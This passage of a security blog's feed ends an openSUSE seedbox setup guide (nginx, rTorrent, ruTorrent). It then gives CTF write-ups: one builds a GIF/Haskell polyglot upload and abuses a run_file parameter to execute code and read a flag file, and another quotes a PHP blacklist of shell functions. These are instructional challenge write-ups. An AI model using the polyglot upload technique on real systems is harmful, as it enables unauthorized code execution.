/var/log/nginx/access.log;</div><div class="line">    error_log /var/log/nginx/error.log;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Gzip Settings</div><div class="line">    ##</div><div class="line">    gzip on;</div><div class="line">    gzip_disable &quot;msie6&quot;;</div><div class="line">    gzip_vary on;</div><div class="line">    gzip_proxied any;</div><div class="line">    gzip_comp_level 6;</div><div class="line">    gzip_buffers 16 8k;</div><div class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Virtual Host Configs</div><div class="line">    ##</div><div class="line">    include /etc/nginx/servers-enabled/*;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Save and quit.</li>
<li>Create the server domain config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>And add the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen 80;</div><div class="line">    listen [::]:80;</div><div class="line">    # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response.</div><div class="line">    return 301 https://$host$request_uri;</div><div class="line">&#125;</div><div class="line"></div><div class="line">##</div><div class="line"># BLOCK SERVEUR HTTPS</div><div class="line">##</div><div class="line">server &#123;</div><div class="line">    # http2 not supported by nginx 1.8.1</div><div class="line">    listen 443 ssl;</div><div class="line">    server_name seedbox.domain.example.org;</div><div class="line">    root /srv/www/htdocs/rutorrent;</div><div class="line">    index index.php index.html index.htm;</div><div class="line"></div><div class="line">##</div><div class="line"># SSL</div><div class="line">##</div><div class="line">    ssl_certificate /etc/nginx/ssl/seedbox.crt;</div><div class="line">    ssl_certificate_key /etc/nginx/ssl/seedbox.key;</div><div class="line"></div><div class="line">    ssl_protocols TLSv1.2;</div><div class="line">    ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES;</div><div class="line">    ssl_ecdh_curve secp384r1;</div><div class="line">    ssl_prefer_server_ciphers on;</div><div class="line"></div><div class="line">    # ssl optimizations</div><div class="line">    ssl_session_timeout 5m;</div><div class="line">    ssl_session_cache shared:SSL:20m;</div><div class="line">    ssl_session_tickets on;</div><div class="line"></div><div class="line">##</div><div class="line"># SECURITY</div><div class="line">##</div><div class="line"></div><div class="line">    add_header X-XSS-Protection &quot;1; mode=block&quot;;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;</div><div class="line"></div><div class="line">##</div><div class="line"># PHP</div><div class="line">##</div><div class="line">    location / &#123;</div><div class="line">    index index.php index.html index.htm;</div><div class="line">    try_files $uri $uri/ /index.php?$args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ~ \.php$ &#123;</div><div class="line">    try_files $uri =404;</div><div class="line">    fastcgi_split_path_info ^(.+\.php)(/.+)$;</div><div class="line">    fastcgi_pass unix:/var/run/php-fpm.sock;</div><div class="line">    fastcgi_index index.php;</div><div class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</div><div class="line">    include fastcgi_params;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /conf/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /share/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Don’t forget to change <code>server_name seedbox.domain.example.org;</code> with your own domain and create a CNAME entry in your DNS configuration.</li>
<li>Enable the server:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ln -s /etc/nginx/servers-available/seedbox.conf /etc/nginx/servers-enabled/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>To configure a self-signed certificate, add the certificate folder:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/ssl</div></pre></td></tr></table></figure></p>
<ul>
<li>Generate self-signed certificate:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd /etc/nginx/ssl</div><div class="line"># openssl ecparam -genkey -name secp384r1 -out seedbox.key</div><div class="line"># openssl req -new -key seedbox.key -sha256 -out seedbox.csr</div><div class="line"># openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt</div></pre></td></tr></table></figure></p>
<ul>
<li>Modify files rights:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 644 /etc/nginx/ssl/*.crt</div><div class="line"># chmod 640 /etc/nginx/ssl/*.key</div></pre></td></tr></table></figure></p>
<ul>
<li>Create an user:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># useradd --shell /bin/bash --create-home sdbox</div><div class="line"># passwd sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>Create needed folder for rtorrent:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Create rtorrent config file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /home/sdbox/.rtorrent.rc</div></pre></td></tr></table></figure></p>
<ul>
<li>Paste the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">scgi_port = 127.0.0.1:5001</div><div class="line">encoding_list = UTF-8</div><div class="line">port_range = 45000-65000</div><div class="line">port_random = no</div><div class="line">check_hash = no</div><div class="line">directory = /home/sdbox/torrents</div><div class="line">session = /home/sdbox/.session</div><div class="line">encryption = allow_incoming, try_outgoing, enable_retry</div><div class="line">schedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;</div><div class="line">schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;</div><div class="line">use_udp_trackers = yes</div><div class="line">dht = off</div><div class="line">peer_exchange = no</div><div class="line">min_peers = 40</div><div class="line">max_peers = 100</div><div class="line">min_peers_seed = 10</div><div class="line">max_peers_seed = 50</div><div class="line">max_uploads = 15</div><div class="line">execute = &#123;sh,-c,/usr/bin/php /srv/www/htdocs/rutorrent/php/initplugins.php sdbox &amp;&#125;</div><div class="line">schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M</div></pre></td></tr></table></figure></p>
<ul>
<li>Give user permissions:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown --recursive sdbox:users /home/sdbox</div><div class="line"># chown root:root /home/sdbox</div><div class="line"># chmod 755 /home/sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the virtual server config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Add the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">location /SDBOX</div><div class="line">&#123;</div><div class="line">    include scgi_params;</div><div class="line">    scgi_pass 127.0.0.1:5001;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don’t forget to change the password in the command):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth</div></pre></td></tr></table></figure></p>
<ul>
<li>Protect the authentification file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 600 /etc/nginx/auth/seedbox_auth</div><div class="line"># chown nginx:nginx /etc/nginx/auth/*</div></pre></td></tr></table></figure></p>
<ul>
<li>Create ruTorrent config file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /srv/www/htdocs/rutorrent/conf/users/sdbox</div><div class="line"># vim /srv/www/htdocs/rutorrent/conf/users/sdbox/config.php</div></pre></td></tr></table></figure></p>
<ul>
<li>And add the content:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;</div><div class="line">$topDirectory = &apos;/home/sdbox&apos;;</div><div class="line">$scgi_port = 5001;</div><div class="line">$scgi_host = &apos;127.0.0.1&apos;;</div><div class="line">$XMLRPCMountPoint = &apos;/SDBOX&apos;;</div><div class="line">$tempDirectory = &apos;/srv/www/htdocs/rutorrent/tmp/&apos;;</div></pre></td></tr></table></figure></p>
<ul>
<li>Correct permissions:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown -R nginx:nginx /srv/www/htdocs/rutorrent</div><div class="line"># chmod 0777 /srv/www/htdocs/rutorrent/share/&#123;settings,torrents,users&#125;</div><div class="line"># systemctl restart nginx.service</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable user lingering:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># loginctl enable-linger sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>To create a rTorrent service, create the file <code>/etc/systemd/system/rtorrent.service</code> containing:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[Unit]</div><div class="line">Description=rTorrent Daemon</div><div class="line">After=network.target</div><div class="line"></div><div class="line">[Service]</div><div class="line">Type=forking</div><div class="line">KillMode=none</div><div class="line">User=sdbox</div><div class="line">ExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrent</div><div class="line">ExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;</div><div class="line">WorkingDirectory=/home/sdbox/</div><div class="line">Restart=on-failure</div><div class="line"></div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable rtorrent at boot time and manually start it:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable rtorrent</div><div class="line"># systemctl start rtorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>To allow web traffic trought the firewall, create this file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/httpd</div></pre></td></tr></table></figure></p>
<ul>
<li>And add this config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## Name: Web server</div><div class="line">## Description: opens ports for web servers in order to allow http and https traffic</div><div class="line"></div><div class="line"># space separated list of allowed TCP ports</div><div class="line">TCP=&quot;80 443&quot;</div></pre></td></tr></table></figure></p>
<ul>
<li>Now add the httpd config in the global settings:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2</div></pre></td></tr></table></figure></p>
<ul>
<li>
<p>And add <code>httpd</code> to <code>FW_CONFIGURATIONS_EXT</code>, for example <code>FW_CONFIGURATIONS_EXT=&quot;sshd httpd&quot;</code>.</p>
</li>
<li>
<p>Now restart the firewall:</p>
</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Install rTorrent, git ang nginx:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;
    
    </summary>
    
      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
    
      <category term="opensuse" scheme="https://rawsec.ml/categories/linux/opensuse/"/>
    
    
      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="https://rawsec.ml/tags/system/"/>
    
      <category term="opensuse" scheme="https://rawsec.ml/tags/opensuse/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF - 150 - try - Web</title>
    <link href="https://rawsec.ml/en/C3CTF-33-150-try-web/"/>
    <id>https://rawsec.ml/en/C3CTF-33-150-try-web/</id>
    <published>2016-12-27T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : 33C3 CTF</li>
<li><strong>Website</strong> : <a href="https://33c3ctf.ccc.ac/" target="_blank" rel="external">33c3ctf.ccc.ac</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/404" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>&quot;I never try anything, I just do it!&quot; <a href="http://78.46.224.73/" target="_blank" rel="external">Do</a></p>
<p>Flag is in /challenge/flag</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>Home page looks like this (need to log in with just a pseudo):</p>
<p><img src="http://i.imgur.com/i5jBUHP.png" alt=""></p>
<p>On the profil page we can upload a profil picture (only gif):</p>
<p><img src="http://i.imgur.com/tPtblHp.png" alt=""></p>
<p>You can't use easy trick to upload any files except gif:</p>
<ul>
<li>no double or triple extensions</li>
<li>no MIME type changing</li>
<li>not just the GIF file header <code>47 49 46 38 37 61</code> (GIF87a) +  GIF file trailer <code>00 3B</code> (;) -- see <a href="http://www.garykessler.net/library/file_sigs.html" target="_blank" rel="external">file signatures</a></li>
</ul>
<p><img src="http://i.imgur.com/gB74rLj.png" alt=""></p>
<p>You have to upload the <s>nearly</s> full <a href="http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever" target="_blank" rel="external">skeleton</a> of the GIF picture.</p>
<p>But you can use a web proxy (like burpsuite) and append whatever you want at the end of the GIF.</p>
<p>As the website seems to execute Haskell algorithms, I tried to append some haskell code.</p>
<p>hello world (just to confirm haskell execution):</p>
<p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = putStrLn <span class="string">"hello world"</span></div></pre></td></tr></table></figure></p>
<p>But just now we want to know where is uploaded our profil picture. It's embedded in the heading and have a location like this <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>.</p>
<p><strong>Note</strong>: path is unpredictable and file is renamed.</p>
<p>What to do now? Try to execute it.</p>
<p>On the home page when you want to run some of the examples, you can see with a web proxy that the file to execute is up to you:</p>
<p><img src="http://i.imgur.com/OMaIqIH.png" alt=""></p>
<p>A legitimate run file is <code>run_file=fib.hs</code>.</p>
<p>If you try the download link you can see that this haskell script is hosted at <code>http://78.46.224.73/static/fib.hs</code>. Just remember that our picture is located at <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>. So what happen if we change it to <code>run_file=33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code> and if we append some haskell code at the end of the picture?</p>
<p>Unfortunatly this lead to an error: <code>lexical error at character '\SOH'</code> (with the tiniest GIF)</p>
<p><img src="http://i.imgur.com/iuLfarc.png" alt=""></p>
<p>or <code>lexical error (UTF-8 decoding error)</code> (with a real GIF)</p>
<p><img src="http://i.imgur.com/7JrAwbI.png" alt=""></p>
<p>So we conclude that the interpreter try to execute the bytecode of the GIF image. Unfortunatly we are not able to upload only haskell.</p>
<p>To limit error possibilities we tried to upload one of the tiniest GIF and replaced 0x01 (SOF) with 0x00 (null) but the website doesn't allow that.</p>
<p>I think we have to upload a GIF file and neutralize GIF data. Then I read an excellent <a href="https://quadhead.de/storing-javascript-code-in-gif-images/" target="_blank" rel="external">article</a> talking about how to store javascript code in a GIF, so I tried to do the same with a haskell comment.</p>
<p>In haskell comments (<a href="https://wiki.haskell.org/Reference_card" target="_blank" rel="external">ref</a>) are like this:</p>
<ul>
<li><code>-- a single line comment</code></li>
<li><code>{- A multiline comment which can continue for many lines -}</code></li>
</ul>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>Hex</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>{</code></td>
<td>0x7b</td>
</tr>
<tr>
<td><code>}</code></td>
<td>0x7d</td>
</tr>
<tr>
<td><code>-</code></td>
<td>0x2d</td>
</tr>
</tbody>
</table>
<p>A legitimate minimalistic GIF would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ xxd handtinyblack.gif</div><div class="line">00000000: 4749 4638 3961 0100 0100 00ff 002c 0000  GIF89a.......,..</div><div class="line">00000010: 0000 0100 0100 0002 003b                 .........;</div></pre></td></tr></table></figure></p>
<p>Our malicious GIF with haskell comment and appended code would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln.gif</div><div class="line">00000000: 4749 4638 3961 7b2d 0100 0100 00ff 002c  GIF89a&#123;-.......,</div><div class="line">00000010: 0000 0000 0100 0100 0002 003b 2d7d 0a6d  ...........;-&#125;.m</div><div class="line">00000020: 6169 6e20 3d20 7075 7453 7472 4c6e 2022  ain = putStrLn &quot;</div><div class="line">00000030: 6865 6c6c 6f20 776f 726c 6422 0a         hello world&quot;.</div></pre></td></tr></table></figure></p>
<p>But again we have an error: <code>Parse error: naked expression at top level. Perhaps you intended to use TemplateHaskell</code></p>
<p><img src="http://i.imgur.com/1uVcIAd.png" alt=""></p>
<p>So we want to change <em>GIF89a</em> from an expression to a variable or a function, but the problem is that in haskell functions can't begin with an uppercase letter, only data <a href="https://wiki.haskell.org/Constructor" target="_blank" rel="external">constructor</a> can. So we can't begin with something like <code>GIF89a :: Integer</code> and if we begin with somethin else than <code>GIF89a</code> the image is not recognized as valid.</p>
<p>All the difficulty is about crafting a valid haskell code beginning with <code>GIF89a</code>.</p>
<p>I went to the official Haskell IRC and asked for this question, the trick is to start the file with a pattern matching and declare it later (<a href="https://wiki.haskell.org/Parsing_expressions_and_statements#Make_token_parser" target="_blank" rel="external">ref</a>).</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln2.gif</div><div class="line">00000000: 4749 4638 3961 203d 2047 4946 3839 617b  GIF89a = GIF89a&#123;</div><div class="line">00000010: 2d01 0001 0000 ff00 2c00 0000 0001 0001  -.......,.......</div><div class="line">00000020: 0000 0200 3b2d 7d0a 6461 7461 2047 4946  ....;-&#125;.data GIF</div><div class="line">00000030: 3839 6120 3d20 4749 4638 3961 0a6d 6169  89a = GIF89a.mai</div><div class="line">00000040: 6e20 3d20 7075 7453 7472 4c6e 2022 6865  n = putStrLn &quot;he</div><div class="line">00000050: 6c6c 6f20 776f 726c 6422 0a              llo world&quot;.</div></pre></td></tr></table></figure></p>
<p>That works now! So now we will just switch the hello world program to somethinf reading the flag folder (we need native function because we can't use <em>import</em> as it needs to be at the beginning of the file in the heading section):</p>
<p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = <span class="keyword">do</span>  </div><div class="line">    contents &lt;- readFile <span class="string">"/challenge/flag"</span></div><div class="line">    print $ contents</div></pre></td></tr></table></figure></p>
<p><img src="http://i.imgur.com/BwVowgX.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh can - Web</title>
    <link href="https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/"/>
    <id>https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p><a href="http://web04.grandprix.whitehatvn.com" target="_blank" rel="external">http://web04.grandprix.whitehatvn.com</a></p>
<p><a href="http://bakweb04.grandprix.whitehatvn.com:8118" target="_blank" rel="external">http://bakweb04.grandprix.whitehatvn.com:8118</a></p>
<p>Powered by People Security Academic - PSA</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p><strong>TL;DR</strong>: Incomplete write-up.</p>
<p>Here is the home page:</p>
<p><img src="http://i.imgur.com/OZw8nP1.png" alt=""></p>
<p>Check the source code:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">What's your name? I just want to say hello :)</div><div class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- function hint() --&gt;</span></div></pre></td></tr></table></figure></p>
<p>So let's try the hint function: <code>http://web04.grandprix.whitehatvn.com/?hint=</code>.</p>
<p><img src="http://i.imgur.com/kJVzdOH.png" alt=""></p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="keyword">array</span>(<span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"exec"</span>, <span class="string">"read"</span>, <span class="string">"open"</span>, <span class="string">"eval"</span>, <span class="string">"backtick"</span>, <span class="string">"`"</span>, <span class="string">"_"</span>);</div><div class="line"></div><div class="line"><span class="keyword">die</span>(<span class="string">"No no no hackers!!"</span>);</div></pre></td></tr></table></figure></p>
<h2 id="submit">Submit</h2>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
</feed>
